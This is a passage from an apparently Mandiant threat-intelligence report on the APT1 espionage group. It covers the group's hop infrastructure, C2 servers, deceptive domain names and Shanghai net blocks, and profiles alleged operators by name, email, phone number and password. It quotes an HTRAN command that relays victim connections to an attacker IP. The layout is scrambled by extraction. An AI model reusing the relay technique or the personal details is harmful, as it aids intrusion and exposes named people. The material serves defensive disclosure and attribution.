minutes” (or hours, depending on the particular backdoor). In lieu\nof manually editing an HTML file on a hop point, we have also observed APT1 intruders uploading new (already-edited)\nHTML files.\n\n###### HTRAN\n\nWhen APT1 attackers are not using WEBC2, they require a “command and control” (C2) user interface so they can\nissue commands to the backdoor. This interface sometimes runs on their personal attack system, which is typically\nin Shanghai. In these instances, when a victim backdoor makes contact with a hop, the communications need to be\nforwarded from the hop to the intruder’s Shanghai system so the backdoor can talk to the C2 server software. We have\nobserved 767 separate instances in which APT1 intruders used the publicly available “HUC Packet Transmit Tool”\nor HTRAN on a hop. As always, keep in mind that these uses are confirmed uses, and likely represent only a small\nfraction of APT1’s total activity.\n\nThe HTRAN utility is merely a middle-man, facilitating connections between the victim and the attacker who is using\nthe hop point.\n\n###### 0101010001 0101010001\n## C2\n### HTRAN\n\n###### 0100100001 0100100001\n\n**Figure 22: The HTRAN tool resides on APT1 hop points and acts as a middle-man**\n\n\n-----\n\n|Number|Net block|Registered Owner|\n|---|---|---|\n|340|223.166.0.0 - 223.167.255.255|China Unicom Shanghai Network|\n|160|58.246.0.0 - 58.247.255.255|China Unicom Shanghai Network|\n|102|112.64.0.0 - 112.65.255.255|China Unicom Shanghai Network|\n|11|139.226.0.0 - 139.227.255.255|China Unicom Shanghai Network|\n|1|143.89.0.0 - 143.89.255.255|Hong Kong University of Science and Technology|\n\n\nTypical use of HTRAN is fairly simple: the attacker must specify the originating IP address (of his or her workstation in\nShanghai), and a port on which to accept connections. For example, the following command, which was issued by an\nAPT1 actor, will listen for incoming connections on port 443 on the hop and automatically proxy them to the Shanghai\nIP address 58.247.242.254 on port 443:\n```\n        htran -tran 443 58.247.242.254 443\n\n```\nIn the 767 observed uses of HTRAN, APT1 intruders supplied 614 distinct routable IP addresses. In other words, they\nused their hops to function as middlemen between victim systems and 614 different addresses. Of these addresses,\n613 of 614 are part of APT1’s home networks:\n\n**Table 9: Net blocks corresponding to IP addresses used to receive HTRAN communications**\n\n**Number** **Net block** **Registered Owner**\n\n**340** 223.166.0.0 - 223.167.255.255 China Unicom Shanghai Network\n\n**160** 58.246.0.0 - 58.247.255.255 China Unicom Shanghai Network\n\n**102** 112.64.0.0 - 112.65.255.255 China Unicom Shanghai Network\n\n**11** 139.226.0.0 - 139.227.255.255 China Unicom Shanghai Network\n\n**1** 143.89.0.0 - 143.89.255.255 Hong Kong University of Science and Technology\n\n###### C2 Server Software on Hop Infrastructure\n\nOccasionally, APT1 attackers have installed C2 server components on systems in their hop infrastructure rather than\nforwarding connections back to C2 servers in Shanghai. In these instances they do not need to use a proxy tool like\nHTRAN to interact with victim systems. However, it does mean that the intruders need to be able to interface with the\n(often graphical) C2 server software running on the hop. We have observed APT1 intruders log in to their hop point,\nstart the C2 server, wait for incoming connections, and then proceed to give commands to victim systems.\n\nWEBC2 variants may include a server component that provides a simple C2 interface to the intruder. This saves the\nintruder from having to manually edit webpages. That is, this server component receives connections from victim\nbackdoors, displays them to the intruder, and then translates the intruder’s commands into HTML tags that the victim\nbackdoors read.\n\n\n-----\n\n###### APT1 Servers\n\nIn the last two years alone, we have confirmed 937 APT1 C2 servers — that is, actively listening or communicating\nprograms — running on 849 distinct IP addresses. However, we have evidence to suggest that APT1 is running\nhundreds, and likely thousands, of other servers (see the Domains section below). The programs acting as APT1\nservers have mainly been: (1) FTP, for transferring files; (2) web, primarily for WEBC2; (3) RDP, for remote graphical\ncontrol of a system; (4) HTRAN, for proxying; and (5) C2 servers associated with various backdoor families (covered in\nAppendix C: The Malware Arsenal).\n\n###### Global distribution of confirmed APT1 servers\n\nSouth Korea (11) Taiwan (6)\nCanada (3)\nAustralia (2)\n\nUS (109) Mexico (2)\n\nNorway (2)\nBelgium (1)\nDenmark (1)\nIndonesia (1)\nIndia (1)\nSingapore (1)\n\nChina (709)\n\n###### Distribution of confirmed APT1 servers in China\n\n139.226.0.0 - 139.227.255.255: 19\nOther: 11 (including 7 in Hong Kong)\n(Shanghai)\n\n112.64.0.0 - 112.65.255.255: 93\n(Shanghai)\n\n58.246.0.0 - 58.247.255.255: 180\n(Shanghai)\n\n223.166.0.0 - 223.167.255.255: 406\n(Shanghai)\n\n**Figure 23: The global distribution of confirmed APT1 servers**\n\n\n-----\n\n###### Domain Names\n\nThe Domain Name System (DNS) is the phone book of the Internet. In the same way that people program named\ncontacts into their cell phones and no longer need to remember phone numbers, DNS allows people to remember\nnames like “google.com” instead of IP addresses. When a person types “google.com” into a web browser, a DNS\ntranslation to an IP address occurs so that the person’s computer can communicate with Google. Names that can be\ntranslated through DNS to IP addresses are referred to as Fully Qualified Domain Names (FQDNs).\n\n###### DNS QUERY  ug-co.hugesoft.org\n 1001100100011010100          \n “Here’s the IP address”\n 0101010001 0101010001\n\n 1001100100011           1010010010100101\n 0100100001 0100100001\n\n## C2\n\n**Figure 24: DNS queries are used to resolve APT1 FQDNs to many C2 server IPs**\n\n\n-----\n\n|avvmail.com shepmas.com syscation.com tibethome.org microsoft-update-info.com busketball.com comrepair.net gmailboxes.com oplaymagzine.com maltempata.com nirvanaol.com 7 zones created cnndaily.com myyahoonews.com satellitebbs.com msnhome.org usabbs.org ns06.net 6 zones created copporationnews.com 7 zones created nytimesnews.net cnnnewsdaily.com applesoftupdate.com 4 zones created micyuisyahooapis.com infobusinessus.org|ifexcel.com bpyoyo.com skyswim.net cslisten.com bigish.net chileexe77.com issnbgkit.net progammerli.com idirectech.com livemymsn.com webservicesupdat giftnews.org onefastgame.net conferencesinfo.c 5 zones created cometoway.org 6 zones created usnftc.org 6 zones created phoenixtvus.com ushongkong.org newsesport.com youipcam.com olmusic100.com todayusa.org bluecoate.com 4 zones created bigdepression.net|\n|---|---|\n\n\n###### APT1 Zone Registrations APT1’s infrastructure includes FQDNs in addition\n\nto the IP addresses discussed above. The FQDNs\nplay an important role in their intrusion campaigns\n\nhugesoft.org because APT1 embeds FQDNs as C2 addresses\n\n2005 within their backdoors.

Compare this to the frequency\nwith which other cities appeared in APT1 zone registration information:\n\n**Table 10: Locations supplied in registration data other than Shanghai, China**\n\n**Number** **City** **State** **Country**\n**7** Beijing          - China\n**5** Calgary Canada\n**4** Guizhou          - China\n**4** Pasadena CA US\n**4** Houston TX US\n**3** Sydney Australia\n**3** Salt Lake UT US\n**3** Washington, DC US\n**2** Homewood AL US\n**2** Kalkaska MI US\n**2** Shallotte NC US\n**2** Yellow Spring OH US\n**2** New York NY US\n**2** Provo UT US\n**2** Shenzhen          - China\n**1** Birmingham AL US\n**1** Scottsdale AZ US\n**1** Sunnyvale CA US\n**1** Albany NY US\n**1** Pearl River NY US\n**1** Chicago          - US\n**1** Moscow          - Guatemala\n**1** Nanning          - China\n**1** Wuhua          - China\n**27** Registration information blocked or not available\n\n\n-----\n\nSome of the supplied registration information is obviously false. For example, consider the registration information\nsupplied for the zone “uszzcs.com” in 2005:\n```\n         Victor etejedaa@yahoo.com +86.8005439436\n         Michael Murphy\n\n```\n795 Livermore St.\nYellow Spring,Ohio,UNITED STATES 45387\n\nHere, a phone number with a Chinese prefix (“+86”) accompanied an address in the United States. Since the United\nStates uses the prefix “+1”, it is highly unlikely that a person living in Ohio would provide a phone number beginning\nwith “+86”. Additionally, the city name is spelled incorrectly, as it should be “Yellow Springs” instead of “Yellow\nSpring”. This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name\nincorrectly multiple times, both for the zones “uszzcs.com” and “attnpower.com”. This suggests that the registrant\nreally thought “Yellow Spring” was the correct spelling and that he or she did not, in fact, live or work in Yellow Springs,\nOhio.\n\nOverall, the combination of a relatively high number of “Shanghai” registrations with obviously false registration\nexamples in other registrations suggests a partially uncoordinated domain registration campaign from 2004 until\npresent, in which some registrants tried to fabricate non-Shanghai locations but others did not. This is supported by\ncontextual information on the Internet for the email address “lfengg@163.com,” which was supplied in the registration\ninformation for seven of the 107 zones. On the site “www.china-one.org,” the email address “lfengg@163.com”\nappears as the contact for the Shanghai Kai Optical Information Technology Co., Ltd., a website production company\nlocated in a part of Shanghai that is across the river from PLA Unit 61398.\n\n**Figure 25: An email address used to register APT1 zones is also a contact for a Shanghai company**\n\n\n-----\n\n###### Naming Themes\n\nAbout half of APT1’s known zones were named according to three themes: news, technology and business. These\nthemes cause APT1 command and control addresses to appear benign at first glance. However, we believe that the\nhundreds of FQDNs within these zones were created for the purpose of APT1 intrusions. (Note: these themes are not\nunique to APT1 or even APT in general.)\n\nThe news-themed zones include the names of well-known news media outlets such as CNN, Yahoo and Reuters.\nHowever, they also include names referencing English-speaking countries, such as “aunewsonline.com” (Australia),\n“canadatvsite.com” (Canada), and “todayusa.org” (U.S.). Below is a list of zones registered by APT1 that are news-\nthemed:\n\n`aoldaily.com` issnbgkit.net `purpledaily.com`\n```\n    aunewsonline.com mediaxsds.net reutersnewsonline.com\n\n```\n`canadatvsite.com` `myyahoonews.com` rssadvanced.org\n`canoedaily.com` `newsesport.com` saltlakenews.org\n```\n    cnndaily.com newsonet.net sportreadok.net\n\n```\n`cnndaily.net` `newsonlinesite.com` todayusa.org\n`cnnnewsdaily.com` newspappers.org `usapappers.com`\ndefenceonline.net `nytimesnews.net` `usnewssite.com`\nfreshreaders.net oplaymagzine.com `yahoodaily.com`\ngiftnews.org `phoenixtvus.com`\n\nThe technology-themed zones reference well-known technology companies (AOL, Apple, Google, Microsoft), antivirus\nvendors (McAfee, Symantec), and products (Blackberry, Bluecoat). APT1 also used more generic names referencing\ntopics like software:\n\n`aolon1ine.com` globalowa.com microsoft-update-info.com\napplesoftupdate.com gmailboxes.com `micyuisyahooapis.com`\n`blackberrycluter.com` hugesoft.org msnhome.org\n```\n    bluecoate.com idirectech.com pcclubddk.net\n\n```\n`comrepair.net` ifexcel.com progammerli.com\ndnsweb.org infosupports.com softsolutionbox.net\n```\n    downloadsite.me livemymsn.com symanteconline.net\n\n```\nfirefoxupdata.com mcafeepaying.com `webservicesupdate.com`\n\nFinally, some zones used by APT1 reflect a business theme. The names suggest websites that professionals might visit:\n\n`advanbusiness.com` companyinfosite.com infobusinessus.org\n`businessconsults.net` conferencesinfo.com `jobsadvanced.com`\nbusinessformars.com `copporationnews.com`\n\nNot every zone stays within APT1’s control forever. Over a campaign lasting for so many years, APT1 has not always\nrenewed every zone in their attack infrastructure. Additionally, while some have simply been allowed to expire,\nothers have been transferred to the organizations that the domain names attempted to imitate. For example, in\nSeptember 2011, Yahoo filed a complaint against “zheng youjun” of “Arizona, USA”, who registered the APT1\nzone “myyahoonews.com”.[37] Yahoo alleged the “<myyahoonews.com> domain name was confusingly similar to\nComplainant’s YAHOO! mark” and that “[zheng youjun] registered and used the <myyahoonews.com> domain name\nin bad faith.” In response, the National Arbitration Forum found that the site “myyahoonews.com” at the time resolved\n\n37 Yahoo! Inc. v. Zheng National Arbitration Forum Claim Number: FA1109001409001, (October 31, 2011) (Tyrus R. Atkinson, Jr., panelist), http://\ndomains.adrforum.com/domains/decisions/1409001.htm, accessed February 6, 2013.\n\n\n-----\n\nto “a phishing web page, substantially similar to the actual WorldSID website...in an effort to collect login credentials\nunder false pretenses.” Not surprisingly, “zheng youjun” did not respond. Subsequently, control of “myyahoonews.\ncom” was transferred from APT1 to Yahoo.\n\n###### Third-Party Services\n\nThe third-party service that APT1 has used the most is known as “dynamic DNS.” This is a service that allows people\nto register subdomains under zones that other people have registered and provided to the service. Over the years,\nAPT1 has registered hundreds of FQDNs in this manner. When they need to change the IP resolution of an FQDN, they\nsimply log in to these services and update the IP resolution of their FQDN via a web-based interface.\n\nIn addition to dynamic DNS, recently we have observed that APT1 has been creating FQDNs that end with\n“appspot.com”, suggesting that they are using Google’s App Engine service.\n\n###### Hijacked FQDNs\n\nAPT1 intruders often use the FQDNs that are associated with legitimate websites hosted by their hop points. We\nconsider these domains to be “hijacked” because they were registered by someone for a legitimate reason, but have\nbeen leveraged by APT1 for malicious purposes. APT1 uses hijacked FQDNs for two main purposes. First, they\nplace malware (usually in ZIP files) on the legitimate websites hosted on the hop point and then send spear phishing\nemails with a link that includes the legitimate FQDN. Second, they embed hijacked FQDNs as C2 addresses in their\nbackdoors.\n\n###### Evidence of a Vast Infrastructure\n\nAs noted above, we have confirmed the existence of 937 servers (listening applications) hosted on 849 distinct IP\naddresses, with the majority of IP addresses registered to organizations in China (709), followed by the U.S. (109).\nIn the last three years we have observed APT1 FQDNs resolving to 988 unique IP addresses that we believe are not\n“sinkhole”[38] or “domain parking”[39] IP addresses:\n\n»» United States: 559\n\n»» China: 263\n\n»» Taiwan: 25\n\n»» Korea: 22\n\n»» United Kingdom: 14\n\n»» Canada: 12\n\n»» Other: 83\n\n38 A sinkhole is a server that accepts redirected connections for known malicious domains. Attempted connections to C2 FQDNs are redirected to\nsinkholes once malicious zones are re-registered by research organizations or security companies in coordination with registration companies.\n\n39 Some IP addresses are used for “domain parking” once the original registrant loses control of a zone or otherwise-registered FQDN, e.g., when\nthe zone expires. These IP addresses usually host advertisements.\n\n\n-----\n\n|Number|Net block|Registered Owner|\n|---|---|---|\n|150|223.166.0.0 - 223.167.255.255|China Unicom Shanghai Network|\n|68|58.246.0.0 - 58.247.255.255|China Unicom Shanghai Network|\n|10|112.64.0.0 - 112.65.255.255|China Unicom Shanghai Network|\n|7|114.80.0.0 - 114.95.255.255|China Telecom Shanghai Network|\n|5|139.226.0.0 - 139.227.255.255|China Unicom Shanghai Network|\n|4|222.64.0.0 - 222.73.255.25|China Telecom Shanghai Network|\n|3|116.224.0.0 – 116.239.255.255|China Telecom Shanghai Network|\n|16|Other (Non-Shanghai)||\n\n\nThe vast majority of the Chinese IP addresses again belong to APT1’s home networks, meaning that in some instances\nAPT1 intruders probably communicated directly to victim systems from their Shanghai systems, bypassing their hop\ninfrastructure:\n\n**Table 11: APT1 FQDNs have resolved to IP addresses within these Chinese net blocks**\n\n**Number** **Net block** **Registered Owner**\n\n**150** 223.166.0.0 - 223.167.255.255 China Unicom Shanghai Network\n\n**68** 58.246.0.0 - 58.247.255.255 China Unicom Shanghai Network\n\n**10** 112.64.0.0 - 112.65.255.255 China Unicom Shanghai Network\n\n**7** 114.80.0.0 - 114.95.255.255 China Telecom Shanghai Network\n\n**5** 139.226.0.0 - 139.227.255.255 China Unicom Shanghai Network\n\n**4** 222.64.0.0 - 222.73.255.25 China Telecom Shanghai Network\n\n**3** 116.224.0.0 – 116.239.255.255 China Telecom Shanghai Network\n\n**16** Other (Non-Shanghai)\n\nThese statistics indicate that there are over 400 IP addresses in the U.S. alone that may have active APT1 servers,\nwhich are as-yet unconfirmed by Mandiant. Additionally, although we know of over 2,500 APT1 FQDNs, there are\nmany APT1 FQDNs that we have not attributed to APT1, which have resolved to even more IP addresses. We estimate\n(conservatively) that APT1’s current hop infrastructure includes over 1,000 servers.\n\n\n-----\n\n##### APT1: Identities\n\nAPT1 is not a ghost in a digital machine. In our effort to underscore that there are actual individuals tasked by the\nPLA behind APT1’s keyboards, we have decided to expose the identities of a select number of APT1 personas. These\nactors have made poor operational security choices, facilitating our research and allowing us to track their activities.\nThey are some of the authors of APT1’s digital weapons and the registrants of APT1 FQDNs and email accounts. These\nactors have expressed interest in China’s cyber warfare efforts, disclosed their locations to be the Pudong New Area\nof Shanghai, and have even used a Shanghai mobile phone number to register email accounts used in spear phishing\ncampaigns.\n\nMethods for attributing APT personnel often involve the synthesis of many small pieces of information into a singular\ncomprehensive picture. Often this unified viewpoint reveals not only the group attribution, but coherent pockets\nof behavior within the group which we perceive to be either small teams or individual actors. We refer to these as\n“personas.” As APT1 personas manage technical resources such as hops and Fully Qualified Domain Names (FQDNs),\nthey have been observed to de-conflict their actions amongst themselves by coordinating the use of specific hops,\nFQDNs, CNO tools (e.g., malware) and ports.\n\nOne additional element working in our favor as threat trackers is the Great Firewall of China (GFWoC). Like many\nChinese hackers, APT1 attackers do not like to be constrained by the strict rules put in place by the Communist Party\nof China (CPC), which deployed the GFWoC as a censorship measure to restrict access to web sites such as google.\ncom, facebook.com, and twitter.com. Additionally, the nature of the hackers’ work requires them to have control of\nnetwork infrastructure outside the GFWoC. This creates a situation where the easiest way for them to log into Facebook\nand Twitter is directly from their attack infrastructure. Once noticed, this is an effective way to discover their real\nidentities.\n\n###### What is the Great Firewall of China?\n\nThe “Great Firewall” is a term used to describe the various technical methods used by the\nChinese government to censor and block or restrict access to Internet services and content\nthat the government considers sensitive or inappropriate. “Inappropriate” content ranges\nfrom pornography to political dissent, and from social media to news sites that may portray\nChina or Chinese officials in a negative light. The “Great Firewall” uses methods such as blocking particular\nIP addresses; blocking or redirecting specific domain names; filtering or blocking any URL containing target\nkeywords; and rate-limiting or resetting TCP connections. Chinese censors also routinely monitor Chinese\nwebsites, blogs, and social media for “inappropriate” content, removing it when found. As a result, Chinese\ncitizens who wish to access censored content must resort to workarounds such as the use of encryption.\nChina continues to improve and further restrict Internet access, most recently (in December 2012) by blocking\nadditional services and limiting or blocking the use of encryption technologies such as Virtual Private Networks.\n\n\n-----\n\n###### APT1 Hacker Profile: Ugly Gorilla (Wang Dong/汪东)\n\nThe story of “Ugly Gorilla” (UG) dates back to 2004.\nA then-professor named Zhang Zhaozhong (张召\n忠), now a retired rear admiral, was in the process\nof helping to shape the future of China’s information\nwarfare strategy.[40] Professor Zhang was already a\nstrong advocate for the “informationization” of military\nunits, and had published several works on military\nstrategy including “Network Warfare” (网络战争) and\n“Winning the Information War” (打赢信息化战争). As\nDirector of the “Military Technology and Equipment”\n(军事科技与装备) department at China’s National\nDefense University (国防大学), professor Zhang was\ninvited to take part in an event titled “Outlook 2004:\nThe International Strategic Situation” in January 2004.\n\nDuring the online question and answer session\nhosted by the PLA Daily’s (解放军报) China Military\n\n**Figure 26: Professor Zhang (张召忠) 16 Jan 2004,**\n\nOnline (中国军网), one young man with the nickname\n\n**source http://www.chinamil.com.cn/site1/gflt/2004-09/30/**\n\n“Greenfield” (绿野) posed a particularly prescient\n\n**content_705216.htm**\n\nquestion.\n\n**“Professor Zhang, I read your book ’Network Warfare‘ and was deeply impressed**\n**by the views and arguments in the book. It is said that the U.S. military has set up**\n**a dedicated network force referred to as a ‘cyber army.’ Does China have a similar**\n**force? Does China have cyber troops?”**\n**_— UglyGorilla 16 Jan 2004_**\n\nLike all users of the China Military Online (chinamil) forums, “Greenfield” was required to sign up with an email\naddress and specify a small bit of information about himself. Thankfully, the Internet’s tendency to immortalize data\npreserved the profile details for us.\n\n40 http://www.chinamil.com.cn/site1/gflt/2004-09/30/content_705216.htm\n\n\n-----\n\n**Figure 27: UglyGorilla chinamil profile, source: http://bbs.chinamil.com.cn/forum/bbsui.jsp?id=(o)5681**\n\n\n-----\n\n**Figure 28: UglyGorilla chinamil profile translated by translate.google.com/**\n\nThus, the persona we call “UglyGorilla” (UG) was first documented. In addition to his email address, UG listed his “real\nname” as “JackWang”.\n\nWithin the year, we saw the first evidence of UG honing the tools of his trade. On October 25, 2004, UG registered the\nnow infamous “hugesoft.org” zone. The “hugesoft.org” zone and its many APT1-attributed hostnames have remained\nactive and under the continuous ownership of UG, and are still active as of the time of this report. Registration\ninformation was most recently updated on September 10, 2012, extending the registration period for the zone well into\n2013. We may see UG relinquish this and other attributed zones as a result of this reporting, in an effort to deter further\ntracking and attribution.\n\nIn 2007, UG authored the\nfirst known sample of the\n\n###### What is a meat chicken?!?\n\nMANITSME family of malware\nand, like a good artist, left his Chinese Hacker Slang: “rouji” ( 肉鸡 ) — Meat Chicken\nclearly identifiable signature in n. — An infected computer\nthe code: “v1.0 No Doubt to\n\nExample strings from MANITSME samples:\n\nHack You, Writed by UglyGorilla,\n\n“d:\\My Documents\\Visual Studio Projects\\rouji\\SvcMain.pdb”\n\n06/29/2007”[sic]. UG’s\ntendency to sign his work is\n\nExamples from other malware…\n\npresent in the strings he chooses\n\n“connecting to rouji”\n\nfor hostnames and even within\n\n“welcome to ***(rouji)”\n\nthe communications protocols\nhis backdoors use. For example,\n\n\n-----\n\nhostnames within other APT1-attributed FQDNs such as “arrowservice.net” and even the newer “msnhome.org”\ncontinue to leave UG’s imprint (note the “ug” in the domains):\n»» ug-opm.hugesoft.org\n»» ug-rj.arrowservice.net\n»» ug-hst.msnhome.org\n\nThough these kinds of obvious attribution links tapered off as UG became more experienced, the protocol signatures of\nhis tools such as MANITSME and WEBC2-UGX continue to be used by APT1 attackers based out of Shanghai.\n\nUG’s consistent use of the username “UglyGorilla” across various Web accounts has left a thin but strong thread of\nattribution through many online communities. In most instances, content such as hacking tools, information security\ntopics, and association with the Shanghai locality are reasonable ways to eliminate false positives. For example, in\nFebruary of 2011, the disclosure of all registered “rootkit.com” accounts published by Anonymous included the user\n“uglygorilla” with the registered email address uglygorilla@163.com. This is the same email used to register for the\n2004 PLA forum and the zone hugesoft.org. Included in the rootkit.com leaked account information was the IP address\n58.246.255.28, which was used to register UG’s account directly from the previously discussed APT1 home range:\n58.246.0.0/15.\n\nIn a few of these accounts, UG has listed something other than “JackWang” as his real name. On February 2, 2006, a\nuser named “uglygorilla” uploaded a file named “mailbomb_1.08.zip” (a bulk email tool) to the Chinese developer site\nPUDN (www.pudn.com). His account details from PUDN included the real name “Wang Dong” (汪东).\n\n**Figure 29: Wang Dong’s Uploaded Files to pudn.com**\n\nIt is important to note two things at this point. First, Chinese names begin with the surname. So “Wang” is the last\nname in 汪东. Second, it is a fairly common practice for the Chinese, even in China, to choose an English first name.\nThus “JackWang” may not have been an alias at all.\n\n\n-----\n\n###### APT1 Hacker Profile: DOTA\n\nAnother APT1 persona is “dota” (DOTA), named for his strong tendency to use variants of that name in almost all\naccounts he creates and uses from his attack infrastructure. DOTA may have taken his name from the video game\n“Defense of the Ancients” which is commonly abbreviated DotA, though we have yet to observe any direct link or other\ndirect reference to the game.\n\nWe have monitored the creation of dozens of accounts, including d0ta010@hotmail.com and dota.d013@gmail.com,\nand have often seen DOTA create several sequential accounts (for example dota.d001 through dota.d015) at web-\nbased email services. Most often these accounts are used in social engineering and phishing attacks or as the contact\nemail address when signing up for other services. For example, DOTA (originating from the APT1 home range IP\naddress 58.247.26.59) with a Simplified Chinese keyboard setting used the email address “d0ta001@hotmail.com”\nfrom his US hop to register the Facebook user “do.ta.5011”(Facebook user id: 100002184628208).\n\nSome services, such as Google’s Gmail, require users to provide a phone number during the registration process to\nwhich they send a validation “text message” containing a verification code. The user must then input the verification\ncode on the website to finalize registration. In an observed session on a compromised machine, DOTA used the phone\nnumber “159-2193-7229” to receive a verification text message from Google, which he then submitted to their page\nwithin seconds.\n\nTelephone numbers in China are organized into a hierarchy containing an area code, prefix, and line number similar\nto phone numbers in the United States, with the addition that a few area codes are allocated for use by mobile phone\nproviders. The phone number “159-2193-7229” breaks down into the “159” area code, which indicates a mobile\nphone provided by China Mobile, and the prefix “2193”, which indicates a Shanghai mobile number. This means at the\nvery least that the number was initially allocated by China Mobile for use in Shanghai. The speed of DOTA’s response\nalso indicates that he had the phone with him at the time.\n\nWe have also observed DOTA using the names Rodney\nand Raith to communicate via email in fluent English **DOTA: a Harry “Poter” fan?**\nwith various targets including South East Asian military The DOTA persona also appears to be a\norganizations in Malaysia and the Philippines. It is unclear fan of the popular “Harry Potter” character,\nif this Gmail account is used exclusively for facilitating his frequently setting accounts “security\nCNO mission, but much of the traffic indicates its use in questions” such as “Who is your favorite\nboth simple phishing attacks, as well as more sophisticated teacher?” and “Who is your best childhood\nemail based social engineering. friend?” to the values “Harry” and “Poter” and\n\ncreating accounts such as poter.spo1@gmail.\ncom with the alternate email address set to\ndota.sb005@gmail.com.\n\n\n-----\n\n**Figure 30: dota.d001@gmail.com (inbox view)[41]**\n\nWhen creating dozens, or hundreds, of accounts in online communities and on victim systems, password management\nbecomes a significant undertaking. Consequently, most APT1 attackers use passwords that are either pattern-based,\nsuch as the keyboard pattern “1qaz2wsx” or highly memorable, using “rootkit” as a password on the information\nsecurity research site rootkit.com. Like many APT1 attackers, DOTA frequently uses keyboard based patterns as\npasswords such as “1qaz@WSX#EDC”. However, there is one password “2j3c1k” extensively used by DOTA that is not\nbased on a keyboard pattern, though he may not be the only APT1 actor that uses it. A numbered “j”, followed by a\nnumbered “c”, and then a numbered “k” is likely shorthand (“j”/”c”/”k”) for the ju/chu/ke (局／处／科) organizational\nstructure (translated to Bureau/Division (or Office)/Section) widely used within PLA General Staff Department\norganizations. Project 2049 describes the typical PLA organizational structure as, “Bureau-level directors … oversee\nbetween six and 14 subordinate sites or offices [chu; 处]… Sites/offices under bureaus are further divided into sections\n\n41 This is a screen capture of DOTA accessing his Gmail account while using a compromised system on APT1’s attack infrastructure.\n\n\n-----\n\n[ke; 科].[42] Given this pattern, it is likely that the password “2j3c1k” stands for 2nd Bureau [Unit 61398], 3rd Division,\n1st Section, demonstrating that those who use these patterns are working together and affiliate themselves to the 2nd\nBureau.\n\nAttempting to track the DOTA persona back to a particular individual is difficult; the trail of his activity does not link\nas clearly to a real world identity. However, Mandiant has been able to establish a clear link between UG and DOTA.\nSpecifically, we have observed the two using shared APT1 infrastructure, FQDNs, and egress IP address ranges. The\ncoordination of this shared infrastructure, combined with their close proximity and association with Unit 61398 makes\nit highly likely that, at the very least, UG and DOTA know each other personally and likely even work together.\n\n###### APT1 Hacker Profile: SuperHard (Mei Qiang/梅强)\n\nThe third and final persona we are revealing has been dubbed “SuperHard” (SH). SH was first observed as a tool\nauthor, and is either the creator or a significant contributor to the AURIGA and BANGAT malware families (covered\nin Appendix C: The Malware Arsenal). Similarly to UG, SH signs much of his work by embedding strings within the\ntools. In particular, elements of the portable executable (PE) file’s VS_VERSIONINFO structure are frequently set to\n“SuperHard,” or cmd.exe copies are modified from “Microsoft corp.” to “superhard corp.”\n\nAdditionally, many of SH’s tools contain driver modules designed to be loaded into the Windows kernel in order to\nsubvert elements of the system. While not unique for APT1 coders, this level of development expertise is certainly\na discriminator that puts SH into a smaller group of highly capable developers within APT1. Often, SH’s tools are\nobserved in use by other APT1 personae and in several instances, other APT groups we track. Given that SH’s tools\nare used by other APT1 actors, and that there are no indications that SH is a full-time operator, we believe that SH is\nprimarily involved in research and development for APT1.\n\nOnce again, in tracking SH we are fortunate to have access to the accounts disclosed from rootkit.com. The rootkit.\ncom account “SuperHard_M” was originally registered from the IP address 58.247.237.4, within one of the known\nAPT1 egress ranges, and using the email address “mei_qiang_82@sohu.com”. We have observed the DOTA persona\nemailing someone with the username mei_qiang_82. The name “Mei Qiang” (梅强) is a reasonably common Chinese\nlast/first name combination. Additionally, it is a common practice for Chinese netizens to append the last two digits of\ntheir birth year, suggesting that SuperHard is in fact Mei Qiang and was born in 1982. Unfortunately, there are several\n“Mei Qiang” identities online that claim a birth year of 1982, making attribution to an individual difficult.\n\nFortunately, we can use SH’s email address to connect him to a number of Websites and forums on which he\nregistered and contributed using that address. Many of these accounts reveal details that reinforce SH’s link to the\n“mei_qiang_82@sohu.com”[43] email address and APT1 affiliation, such as SH offering to write Trojans for money, his\ninvolvement with malicious Windows kernel research (incidentally, also commented on by “greenfield”, possibly UG),\nand more recently, being local to Shanghai’s Pudong New Area.[44]\n\n42 Mark A.

The detection and awareness of APT1 is made\neven more probable by the sheer scale and sustainment of attacks that we have observed and documented in this\nreport. Therefore the most probable conclusion is that APT1 is able to wage such a long-running and extensive cyber\nespionage campaign because it is acting with the full knowledge and cooperation of the government. Given the\nmission, resourcing, and location of PLA Unit 61398, we conclude that PLA Unit 61398 is APT1. Table 12 summarizes\nthe parallels between APT1 and PLA Unit 61398.\n\n**Table 12: Matching characteristics between APT1 and Unit 61398**\n\n**Characteristic** **APT1 (as directly observed)** **Unit 61398 (as reported)**\n\n**Mission area** » Steals intellectual property from English-» » Conducts computer network operations »\nspeaking organizations against English-speaking targets\n\n» Targets strategic emerging industries »\nidentified in China’s 12th Five Year Plan\n\n**Tools, Tactics, and** » Organized, funded, disciplined operators » » Conducts military-grade computer network »\n**Procedures (TTPs)** with specific targeting objectives and a operations\ncode of ethics (e.g., we have not witnessed\nAPT1 destroy property or steal money\nwhich contrasts most “hackers” and even\nthe most sophisticated organize crime\nsyndicates)\n\n**Scale of operations** » Continuously stealing hundreds of terabytes » » As part of the PLA, has the resources »\nfrom 141 organizations since at least 2006; (people, money, influence) necessary to\nsimultaneously targeting victims across at orchestrate operation at APT1’s scale\nleast 20 major industries\n\n» Has hundreds, perhaps thousands of »\n\n» Size of “hop” infrastructure and continuous » people, as suggested by the size for their\nmalware updates suggest at least dozens facilities and position within the PLA\n(but probably hundreds) of operators with\nhundreds of support personnel\n\n\n-----\n\n|Characteristic|APT1 (as directly observed)|Unit 61398 (as reported)|\n|---|---|---|\n|Expertise of personnel|» »English language proficiency » »Malware authoring » »Computer hacking » »Ability to identify data worth stealing in 20 industries|» »English language requirements » »Operating system internals, digital signal processing, steganography » »Recruiting from Chinese technology universities|\n|Location|» »APT1 actor used a Shanghai phone number to register email accounts » »Two of four “home” Shanghai net blocks are assigned to the Pudong New Area » »Systems used by APT1 intruders have Simplified Chinese language settings » »An APT1 persona’s self-identified location is the Pudong New Area|» »Headquarters and other facilities spread throughout the Pudong New Area of Shanghai, China|\n|Infrastructure|» »Ready access to four main net blocks in Shanghai, hosted by China Unicom (one of two Tier 1 ISPs in China) » »Some use of China Telecom IP addresses (the other Tier 1 ISP)|» »Co-building network infrastructure with China Telecom in the name of national defense|\n\n\n**Characteristic** **APT1 (as directly observed)** **Unit 61398 (as reported)**\n\n**Expertise of** » English language proficiency» » English language requirements»\n**personnel**\n\n» Malware authoring» » Operating system internals, digital signal »\n\nprocessing, steganography\n\n» Computer hacking»\n\n» Recruiting from Chinese technology »\n\n» Ability to identify data worth stealing in 20 »\n\nuniversities\n\nindustries\n\n**Location** » APT1 actor used a Shanghai phone » » Headquarters and other facilities spread »\nnumber to register email accounts throughout the Pudong New Area of\n\nShanghai, China\n\n» Two of 